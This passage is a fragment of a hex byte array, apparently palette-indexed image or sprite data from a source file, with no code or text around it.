0xE5, 0x88, 0xE5, 0xE5, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE5, 0xE5, 0xE6, 0xE6, 0xCE, 0xE7, 0xE6,
0xE5, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0xE5, 0xE5, 0xE5, 0xE6, 0xE6, 0xE5, 0x14, 0x14, 0xE6, 0xE6, 0xE6, 0xE5, 0xE5, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE5, 0xE4, 0x86, 0x86, 0x9F, 0x9C, 0x18,
0x19, 0x07, 0x17, 0x08, 0xE4, 0xE4, 0x08, 0x9E, 0x17, 0x18, 0x17, 0x17, 0x17, 0x18, 0x17, 0x17,
0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19,
0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1C, 0x1B, 0x1B,
0x1B, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B,
0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1C, 0x1D, 0x1D,
0x1E, 0x1D, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D,
0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1B, 0x17, 0xC8, 0x11, 0x12, 0xC8,
0xC9, 0xC9, 0xC9, 0x07, 0x19, 0x07, 0x1B, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07,
0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x9F, 0xCE, 0xCF, 0xCF, 0xCE, 0xE5, 0xE5, 0xE5, 0xE6,
0xCE, 0xCE, 0xCE, 0xCF, 0xCF, 0xCE, 0xE6, 0xE4, 0x87, 0xA0, 0x9F, 0x9F, 0xA0, 0x87, 0x14, 0x87,
0x87, 0x87, 0x87, 0x87, 0x87, 0x87, 0xE4, 0xE5, 0xE6, 0xCE, 0xCF, 0xE6, 0xE5, 0xE5, 0xE5, 0x14,
0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x14, 0x14, 0x14, 0xE4, 0xE5, 0xE5, 0xE6, 0xE6, 0xE5, 0x14, 0x14, 0xE5, 0xE6, 0xE6, 0xE6,
0xE6, 0xE6, 0xE8, 0xCF, 0xCF, 0xE7, 0xE4, 0x87, 0x87, 0x87, 0xE4, 0x86, 0x85, 0x9C, 0x18, 0x19,
0x19, 0x18, 0x9D, 0x86, 0xE4, 0xE4, 0x08, 0x9E, 0x9D, 0x17, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18, 0x19,
0x19, 0x07, 0x07, 0x07, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B,
0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x07, 0x1B, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1C,
0x1C, 0x1B, 0x1B, 0x1B, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D,
0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E,
0x1E, 0x1E, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1D, 0x19, 0xE3, 0x12, 0x11,
0x11, 0x11, 0x11, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x1B,
0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x9E, 0xCE, 0xCF, 0xE6, 0xE6, 0xCE, 0xE5, 0xE6, 0xE6, 0xE6,
0xE6, 0xE5, 0x87, 0x87, 0x87, 0x87, 0x87, 0xA0, 0x9F, 0x9F, 0x9F, 0xA0, 0xA0, 0x87, 0x87, 0x87,
0xA0, 0xA0, 0xA0, 0xA0, 0xA0, 0xA0, 0x14, 0x14, 0xE4, 0xCE, 0xCF, 0xCF, 0xE6, 0x14, 0x14, 0x08,
0x08, 0x08, 0x08, 0x08, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x9F, 0x9E, 0x9E, 0x9E, 0x9E,
0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0xA0, 0x87, 0x86, 0x87, 0xE4, 0xE4, 0xE4, 0x86, 0x85, 0x9D, 0x17,
0x18, 0x18, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x9C, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C,
0x9D, 0x9E, 0x9E, 0x9D, 0x17, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x19,
0x18, 0x19, 0x19, 0x19, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1C, 0x1C,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E,
0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1B, 0x9A, 0x11,
0x11, 0x11, 0x11, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x19, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x17, 0x18, 0x17, 0x17, 0x9D,
0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x9E, 0x14, 0x08, 0x14, 0xE5, 0xE5, 0x14, 0x86, 0x9F, 0x9E,
0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9F, 0x08, 0x9F, 0x9F, 0x9F, 0x9E, 0x9F, 0x9F, 0xA0, 0xA0, 0xA0,
0x9F, 0x9F, 0x9F, 0xA0, 0xA0, 0xA0, 0xA0, 0x08, 0x08, 0x14, 0xE5, 0xE6, 0xE6, 0xE5, 0xE5, 0x14,
0x14, 0x08, 0x08, 0x08, 0x08, 0x9F, 0x9F, 0x9F, 0x9F, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x9F, 0x9F, 0x08, 0x08, 0x9F, 0x9E, 0x9D, 0x9E, 0x9D, 0x9D, 0x9E,
0x9F, 0x08, 0x87, 0x87, 0x87, 0xE4, 0xCD, 0xCD, 0xCD, 0xE4, 0x87, 0x86, 0x86, 0x9C, 0x18, 0x18,
0x9C, 0x9C, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B,
0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1C, 0x1B, 0x1B,
0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C,
0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1C, 0x18,
0xCA, 0x12, 0x12, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x19, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x9E, 0x9E, 0x9C, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9D, 0x9F, 0x9F, 0x9D, 0x9D, 0x9D, 0x9D, 0x08, 0x08, 0x9E,
0x9D, 0x17, 0x17, 0x17, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9F, 0x9F, 0x9F,
0x9F, 0x9F, 0xA0, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0xA0, 0x08, 0x14, 0x14, 0x14, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x9F, 0x9F, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9E, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E,
0x14, 0xE4, 0x14, 0x87, 0x87, 0x87, 0xE5, 0xCD, 0xCD, 0xE4, 0x87, 0x86, 0x86, 0x9D, 0x18, 0x18,
0x9C, 0x9C, 0x17, 0x9C, 0x17, 0x17, 0x18, 0x19, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x9C, 0x9B, 0x08, 0x08, 0xE4, 0xE4, 0x08, 0x08,
0x9B, 0x17, 0x18, 0x18, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x18, 0x17,
0x9C, 0x17, 0x18, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1C, 0x1C, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1E, 0x1D,
0x07, 0x16, 0xE3, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18, 0x17, 0x17,
0x17, 0x18, 0x18, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17,
0x17, 0x17, 0x9D, 0x9D, 0x17, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E,
0x9E, 0x9D, 0x17, 0x17, 0x9C, 0x9D, 0x9D, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9F,
0x9F, 0xA0, 0x08, 0xA0, 0x9F, 0x9F, 0x9F, 0x9F, 0xA0, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x9F, 0x9F, 0x9F, 0x9F, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E,
0x9F, 0x9F, 0x9E, 0x9E, 0x9E, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9E, 0x9E, 0x9D, 0x9E, 0x9E, 0x86,
0xE5, 0xCD, 0xCD, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCC, 0x87, 0x86, 0x85, 0x9C, 0x18, 0x19,
0x9C, 0x9D, 0x17, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x19,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x18,
0x18, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B,
0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1C, 0x1C, 0x1D, 0x1D, 0x1C,
0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1D, 0x1D, 0x1E, 0x1D, 0x1D,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1D, 0x1C, 0x18, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x18, 0x18, 0x19, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D,
0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x16, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9F,
0x9F, 0xA0, 0xA0, 0x9F, 0x9E, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F,
0x08, 0x08, 0x08, 0x9F, 0x9F, 0x08, 0x08, 0xE4, 0xE5, 0xE5, 0xE5, 0xE5, 0xE4, 0x08, 0x08, 0x87,
0x14, 0x87, 0x86, 0x86, 0x86, 0x86, 0x87, 0xE4, 0xE5, 0xE5, 0xE5, 0xE5, 0xE5, 0xCE, 0xCE, 0xCF,
0xCF, 0xB6, 0xB6, 0xB7, 0xB6, 0xCF, 0xCE, 0xCE, 0xCD, 0xCC, 0x87, 0x86, 0x86, 0x85, 0x9C, 0x19,
0x19, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x07, 0x07,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x1B, 0x07, 0x07, 0x07,
0x19, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x07, 0x07, 0x19, 0x19, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1C,
0x1C, 0x1C, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D,
0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1C, 0x1C, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1E, 0x1D, 0x1C, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x18,
0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9D, 0x9D, 0x17, 0x17, 0x17, 0x9C, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9F, 0x08,
0x08, 0x9F, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9E, 0x9F, 0x9F, 0x9E, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x9F, 0x08, 0x14, 0xE5, 0xE6, 0xCE, 0xCE, 0xCE, 0xCF, 0xCE, 0xCE, 0xCD, 0xCD,
0xCE, 0xCE, 0xCD, 0xCD, 0xCD, 0xCD, 0xCD, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCF, 0xB6, 0xB6, 0xB7,
0xB7, 0xB7, 0xB7, 0xB6, 0xCE, 0x86, 0x86, 0x87, 0xCD, 0xCD, 0xCD, 0xCD, 0xCC, 0x87, 0x85, 0x9C,
0x19, 0x18, 0x9C, 0x9C, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19,
0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x07, 0x07, 0x07, 0x1B, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1D,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1B, 0x1C, 0x1C, 0x1D,
0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1C, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1B, 0x07, 0x07, 0x19, 0x18, 0x18, 0x19, 0x19, 0x07, 0x07, 0x19, 0x19, 0x19,
0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C,
0x9D, 0x9D, 0x9D, 0x17, 0x17, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9F, 0x08, 0x08, 0x08, 0x14, 0x14, 0xE4, 0xE5, 0xE5, 0xE5, 0xE5, 0xE5,
0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE5, 0xCD, 0xCD, 0xCD, 0xCD, 0xCE, 0xCE, 0xCF, 0xB6, 0xB6, 0xB6,
0xCF, 0xCD, 0x87, 0x86, 0x85, 0x9E, 0x85, 0x87, 0xCD, 0xB5, 0xB5, 0xCE, 0xCE, 0xCD, 0x87, 0x85,
0x18, 0x19, 0x18, 0x17, 0x17, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18, 0x19,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x07, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07,
